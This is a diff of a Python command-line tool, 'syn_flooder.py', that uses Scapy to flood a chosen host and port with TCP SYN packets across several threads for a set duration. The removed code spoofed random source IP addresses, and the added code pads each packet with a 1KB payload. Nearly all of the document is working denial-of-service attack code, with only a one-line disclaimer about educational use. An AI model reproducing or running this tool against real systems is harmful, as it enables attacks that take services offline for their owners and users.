@@ -11,10 +11,10 @@ Description:
     Uses Scapy for low-level packet crafting.
 
 Usage:
-    python3 syn_flooder.py [--target HOST] [--port PORT] [--duration SECONDS] [--threads N]
+    python3 syn_flooder.py <target> <duration> [--port PORT]
 
 Example:
-    python3 syn_flooder.py --target 192.168.1.1 --port 80 --duration 10
+    python3 syn_flooder.py 192.168.1.1 10 --port 80
 """
 
 import socket
@@ -22,7 +22,6 @@ import sys
 import argparse
 import time
 import threading
-import random
 from datetime import datetime
 
 def _ensure_package_local(package_name, import_name=None, prompt=True):
@@ -67,37 +66,27 @@ def _ensure_package_local(package_name, import_name=None, prompt=True):
         return None
 
 
-    # Ensure Scapy is available
+# Ensure Scapy is available
 _ensure_package_local("scapy")
 
 try:
-    from scapy.IP import IP
-    from scapy.TCP import TCP
-    from scapy.layers.inet import IP as IP_Layer, TCP as TCP_Layer
-    from scapy.all import send, IP as IP_Scapy, TCP as TCP_Scapy, RandShort
+    from scapy.all import IP, TCP, Raw, send, RandShort
 except ImportError:
-    try:
-        # Fallback for older Scapy versions
-        from scapy.all import IP, TCP, send, RandShort
-        IP_Scapy = IP
-        TCP_Scapy = TCP
-    except ImportError:
-        print("Erro: Scapy não foi encontrada ou falhou a importação.")
-        print("Instale com: pip install scapy")
-        sys.exit(1)
+    print("Erro: Scapy não foi encontrada ou falhou a importação.")
+    print("Instale com: pip install scapy")
+    sys.exit(1)
+
+# Suppress Scapy warnings
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+try:
+    from scapy.conf import conf
+    conf.verbose = False
+except:
+    pass
 
     
 # Section: SYN Flooder functions
-    
-def generate_random_ip():
-    """Generate a random spoofed source IP address."""
-    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
-
-
-def generate_random_port():
-    """Generate a random source port."""
-    return random.randint(49152, 65535)
-
 
 def syn_flood_worker(target, target_port, duration, packets_sent, lock):
     """Worker thread that sends TCP SYN packets to a target."""
@@ -105,21 +94,19 @@ def syn_flood_worker(target, target_port, duration, packets_sent, lock):
     count = 0
 
     try:
-        while time.time() < end_time:
-            # Random spoofed source IP
-            src_ip = generate_random_ip()
-            src_port = generate_random_port()
+        # Build packet
+        ip = IP(dst=target)
+        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+        raw = Raw(b"X" * 1024)  # 1KB payload
+        packet = ip / tcp / raw
 
-            # Build IP + TCP SYN packet
+        while time.time() < end_time:
             try:
-                packet = IP_Scapy(dst=target, src=src_ip) / TCP_Scapy(dport=target_port, sport=src_port, flags="S")
-                
-                # Send packet without waiting for response (send, not sr)
                 send(packet, verbose=False)
                 count += 1
-
-                # Show progress every 500 packets
-                if count % 500 == 0:
+                
+                # Show progress every 1000 packets
+                if count % 1000 == 0:
                     with lock:
                         print(f"  {count:,} pacotes SYN enviados para {target}:{target_port}")
 
@@ -131,7 +118,6 @@ def syn_flood_worker(target, target_port, duration, packets_sent, lock):
         pass
     except PermissionError:
         print("  ERRO: Este script requer privilégios de root/administrator para enviar pacotes raw!")
-        print("     Execute com: sudo python3 syn_flooder.py ...")
         sys.exit(1)
     except Exception as e:
         print(f"  Erro: {e}")
@@ -147,6 +133,7 @@ def flood_target(target, target_port, duration, num_threads):
     print(f"   Duração: {duration} segundos")
     print(f"   Threads: {num_threads}")
     print(f"   Protocolo: TCP SYN (ligações half-open)")
+    print(f"   Payload: 1KB por pacote")
     print("-" * 60)
 
     packets_sent = []
@@ -174,7 +161,6 @@ def flood_target(target, target_port, duration, num_threads):
     except PermissionError:
         print("\nERRO: Privilégios insuficientes!")
         print("Este script requer privilégios de root para manipular pacotes raw.")
-        print("Execute com: sudo python3 syn_flooder.py ...")
         sys.exit(1)
 
     duration_real = time.time() - t_start
@@ -197,19 +183,15 @@ def main():
         description="SYN Flooder - Ataque de negação de serviço (DoS) via TCP SYN",
         epilog="Apenas para fins educacionais em ambientes autorizados. Requer root/administrator."
     )
-    parser.add_argument("--target", "-t", help="Alvo (IP ou hostname)")
+    parser.add_argument("target", help="Alvo (IP ou hostname)")
+    parser.add_argument("duration", type=int, help="Duração em segundos")
     parser.add_argument("--port", "-p", type=int, default=80, help="Porta TCP (default: 80/HTTP)")
-    parser.add_argument("--duration", "-d", type=int, default=10, help="Duração em segundos (default: 10)")
     parser.add_argument("--threads", "-n", type=int, default=4, help="Número de threads (default: 4)")
 
-    args = parser.parse_args()
-
-    # If target was not provided, prompt
-    if not args.target:
-        args.target = input("Alvo (IP ou hostname): ").strip()
-        if not args.target:
-            print("Nenhum alvo fornecido. Abortando.")
-            sys.exit(1)
+    try:
+        args = parser.parse_args()
+    except SystemExit:
+        sys.exit(1)
 
     # Validations
     if args.port < 1 or args.port > 65535:
@@ -263,8 +245,6 @@ def main():
     except PermissionError:
         print("\nERRO: Privilégios insuficientes!")
         print("Este script requer privilégios de root para manipular pacotes raw.")
-        print("\nExecute com:")
-        print(f"  sudo python3 syn_flooder.py --target {args.target} --port {args.port} --duration {args.duration}")
         sys.exit(1)
 
 
